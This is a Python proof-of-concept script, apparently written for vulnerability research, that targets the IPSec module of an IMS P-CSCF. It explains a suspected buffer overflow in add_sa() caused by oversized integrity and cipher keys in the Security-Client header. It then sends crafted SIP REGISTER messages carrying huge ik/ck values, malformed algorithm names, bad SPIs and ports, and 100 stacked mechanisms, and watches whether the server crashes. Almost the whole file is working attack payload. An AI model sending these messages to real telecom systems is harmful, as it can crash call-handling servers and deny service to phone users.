#!/usr/bin/env python3
"""
Targeted IPSec Module Crash Test
================================
Target: ims_ipsec_pcscf/ipsec.c add_sa() function

Vulnerability Analysis:
----------------------
In ipsec.c, the add_sa() function:
1. l_auth_algo_buf is XFRM_TMPLS_BUF_SIZE (1024) bytes
2. string_to_key() writes ik.len/2 bytes to l_auth_algo->alg_key
3. struct xfrm_algo overhead: ~68 bytes (alg_name[64] + alg_key_len[4])
4. Available space: ~956 bytes
5. If ik.len > 1912 hex chars, buffer overflow occurs!

The ik (integrity key) comes from Security-Client header - ATTACKER CONTROLLED!

Attack Vector:
- Send REGISTER with Security-Client containing oversized ik/ck values
- This happens during IPSec SA setup after 401 response
"""

import socket
import subprocess
import time
import sys

PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060
UE_IP = "172.29.0.18"
IMS_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"


def check_pcscf():
    """Check if P-CSCF is running"""
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', 'pcscf'],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def send_sip(msg, timeout=3):
    """Send SIP message"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(msg.encode(), (PCSCF_IP, PCSCF_PORT))
        try:
            data, _ = sock.recvfrom(65535)
            return data.decode(errors='ignore')
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return str(e)


def test_ipsec_key_overflow():
    """
    Test oversized IK/CK in Security-Client header.

    The key insight: ik and ck values in Security-Client are hex strings
    that get converted to binary by string_to_key().

    Buffer size: 1024 bytes
    struct xfrm_algo overhead: ~68 bytes
    Available for key: ~956 bytes

    string_to_key converts hex string to binary: len/2 bytes
    So if ik.len > 1912, we overflow!
    """
    print("[*] Testing IPSec key overflow")
    print("    Buffer: 1024 bytes, Available: ~956 bytes")
    print("    Overflow when ik.len > 1912 hex chars")

    # Test cases with increasing key sizes
    test_sizes = [
        ("Normal (32 chars)", 32),
        ("Large (512 chars)", 512),
        ("Very Large (1024 chars)", 1024),
        ("Overflow (2000 chars)", 2000),
        ("Big Overflow (4000 chars)", 4000),
        ("Huge Overflow (10000 chars)", 10000),
    ]

    for name, size in test_sizes:
        print(f"\n  Testing: {name}")

        # Generate hex key of specified size
        ik_hex = "AB" * (size // 2)
        ck_hex = "CD" * (size // 2)

        # Build REGISTER with Security-Client
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-ipsec-{size}\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test{size}\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: ipsec-test-{size}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Security-Client: ipsec-3gpp; alg=hmac-md5-96; ealg=aes-cbc; "
            f"spi-c=1000; spi-s=2000; port-c=5100; port-s=6100; "
            f"ik={ik_hex}; ck={ck_hex}\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        print(f"    Sending REGISTER with ik/ck size {size}...")
        resp = send_sip(msg)
        print(f"    Response: {resp[:80] if resp else 'No response'}")

        time.sleep(0.5)

        if not check_pcscf():
            print(f"\n  !!! P-CSCF CRASHED with key size {size} !!!")
            return True

    return False


def test_ipsec_algorithm_confusion():
    """
    Test algorithm confusion attacks.
    """
    print("\n[*] Testing algorithm confusion")

    test_cases = [
        # Unknown algorithm
        ("Unknown alg", "ipsec-3gpp; alg=unknown-alg; ealg=aes-cbc; spi-c=1; spi-s=2; port-c=5100; port-s=6100"),
        # Empty algorithm
        ("Empty alg", "ipsec-3gpp; alg=; ealg=; spi-c=1; spi-s=2; port-c=5100; port-s=6100"),
        # Algorithm with special chars
        ("Special chars", "ipsec-3gpp; alg=hmac-md5-96\x00extra; ealg=aes-cbc; spi-c=1; spi-s=2; port-c=5100; port-s=6100"),
        # Very long algorithm name
        ("Long alg name", f"ipsec-3gpp; alg={'A' * 1000}; ealg=aes-cbc; spi-c=1; spi-s=2; port-c=5100; port-s=6100"),
        # Negative SPI
        ("Negative SPI", "ipsec-3gpp; alg=hmac-md5-96; ealg=aes-cbc; spi-c=-1; spi-s=-2; port-c=5100; port-s=6100"),
        # Zero ports
        ("Zero ports", "ipsec-3gpp; alg=hmac-md5-96; ealg=aes-cbc; spi-c=1; spi-s=2; port-c=0; port-s=0"),
        # Huge ports
        ("Huge ports", "ipsec-3gpp; alg=hmac-md5-96; ealg=aes-cbc; spi-c=1; spi-s=2; port-c=999999; port-s=999999"),
    ]

    for name, sec_client in test_cases:
        print(f"\n  Testing: {name}")

        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-alg-{hash(name) % 10000}\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=algtest\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: alg-test@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Security-Client: {sec_client}\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        resp = send_sip(msg)
        print(f"    Response: {resp[:80] if resp else 'No response'}")

        time.sleep(0.3)

        if not check_pcscf():
            print(f"\n  !!! P-CSCF CRASHED on {name} !!!")
            return True

    return False


def test_ipsec_multi_mechanism():
    """
    Test multiple mechanisms in Security-Client.
    """
    print("\n[*] Testing multiple mechanisms")

    # Many mechanisms
    mechanisms = ",".join([
        f"ipsec-3gpp; alg=hmac-md5-96; ealg=aes-cbc; spi-c={i}; spi-s={i+1}; port-c=5100; port-s=6100"
        for i in range(100)
    ])

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-multi\r\n"
        f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=multi\r\n"
        f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
        f"Call-ID: multi-test@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
        f"Security-Client: {mechanisms}\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending 100 mechanisms...")
    resp = send_sip(msg)
    print(f"  Response: {resp[:80] if resp else 'No response'}")

    return not check_pcscf()


def main():
    print("=" * 60)
    print("IPSec Module Targeted Crash Test")
    print("=" * 60)

    if not check_pcscf():
        print("ERROR: P-CSCF is not running!")
        sys.exit(1)

    crashed = []

    # Test 1: Key overflow
    if test_ipsec_key_overflow():
        crashed.append("key_overflow")
        print("\nRestarting P-CSCF...")
        subprocess.run(['docker', 'restart', 'pcscf'], capture_output=True)
        time.sleep(10)

    # Test 2: Algorithm confusion
    if test_ipsec_algorithm_confusion():
        crashed.append("algorithm_confusion")
        print("\nRestarting P-CSCF...")
        subprocess.run(['docker', 'restart', 'pcscf'], capture_output=True)
        time.sleep(10)

    # Test 3: Multiple mechanisms
    if test_ipsec_multi_mechanism():
        crashed.append("multi_mechanism")

    print("\n" + "=" * 60)
    print("Summary")
    print("=" * 60)
    if crashed:
        print(f"Crashes triggered by: {', '.join(crashed)}")
    else:
        print("No crashes detected")
        print("\nNote: The IPSec SA creation happens AFTER 401 response.")
        print("To trigger the vulnerability, need to complete full auth flow")
        print("with malformed ik/ck values in the authenticated REGISTER.")


if __name__ == '__main__':
    main()
